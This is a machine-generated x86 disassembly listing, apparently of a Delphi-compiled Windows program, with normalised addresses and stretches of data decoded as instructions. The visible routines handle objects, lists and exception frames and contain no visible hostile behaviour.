mov [ 0x4fc000b9 ] eax
adc [ eax ] eax
add [ esi - 0x6d ] esp
enter 0x42 0xf
add bh bh
push eax
lodsd [ esi ]
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0xc8747265
inc edx
add [ ecx ] al
adc ecx [ ecx + 0x45 ]
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
add [ eax ] al
lea eax [ eax ]
mov al 0xc9
inc edx
add [ eax ] al
add bh bh
dec [ ebp - 0x364fffc0 ]
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
jo r-xdata
cmp cl [ ecx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add [ edi ] cl
add bh bh
dec [ ebx + 0x42c8b4c0 ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42d59b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ eax + eax ] al
inc edx
insd
inc ebp
js r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f0c
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c7fc
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
jmp r-xdata
int3
mov eax eax
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5a2
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40496c
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
inc ebx
xor edi edi
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
dec [ ebx + 0x42c844c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42bc14
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057cc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42c9cc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xca
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ah
0x42
sub_42c9ec
or al 0x0
add [ eax ] al
mov al 0x10
inc eax
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add eax 0xffffffd8
jmp sub_42d6c0
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ecx * 8 + 0x42 ] dh
add [ eax + eax ] al
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
int3
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42d59b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f0c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5a2
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40496c
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42bc14
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057cc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42cbcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42cc42
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42cd58
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4057cc
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cc49
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cce4
mov [ rw-data ] eax
sub_42cc50
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cce4
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4057f8
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42cca8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4057cc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42cce4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bbd8
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bbd8
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bbd8
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403eb8
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_42cd58
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ce59
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cca8
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42bc28
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d32c
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4057b4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d32c
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cca8
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42bc28
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cca8
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42bc28
mov ecx r-xdata
call sub_4057f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce60
lea eax [ ebp - 0xc ]
call sub_4057b4
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
sub edx 0xfffffff8
sub_42ce78
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42ceb8
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42cee8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42d07a
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d015
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d081
lea eax [ ebp - 0x10 ]
call sub_403eb8
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
mov eax esi
xor edx edx
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42bc14
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42d088
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42d16d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d174
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40496c
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42bc14
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057cc
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42bc14
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057cc
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42d190
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x20 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d395
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor edi edi
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x24
mov edx ebx
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d39c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
test edi edi
jne r-xdata
inc ebx
xor esi esi
cmp edi 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404378
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x10 ] esi
inc edi
dec edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_42bc14
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
xor esi esi
xor edx edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
call sub_403128
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_42bc14
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x18 ]
call sub_403128
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0xc ]
dec [ ebp - 0x24 ]
jne r-xdata
sub_42d3a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42d497
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f0c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d49e
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40496c
lea eax [ ebp - 0x10 ]
call sub_4057b4
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42bc14
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4057cc
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42d4bc
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42d59b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f0c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8b8
call sub_4038f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d5a2
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40496c
lea eax [ ebp - 0x8 ]
call sub_4057b4
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42bc14
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057cc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057f8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42d5bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405828
xor eax eax
push ebp
push sub_42d60b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4057cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d612
lea eax [ ebx + 0xc ]
call sub_4057b4
sub_42d618
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404368
xor eax eax
push ebp
push sub_42d6ad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f0c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_42d3a4
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d6b4
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax ebx
call sub_42ceb8
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42cee8
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_42d088
sub_42d6d8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_42bc14
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_42bc14
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4185f0
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_42bc14
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4185f0
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4185f0
sub_42d764
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_42ce78
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403128
mov eax [ esi + 0x14 ]
call sub_403128
mov eax [ esi + 0x10 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4057b4
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_42d7b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d7ef
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d7f6
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_42d800
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d825
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d82c
retn
sub_42d838
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42d869
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d870
retn
mov eax [ rw-data ]
call sub_403128
sub_42d87c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42d8b0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
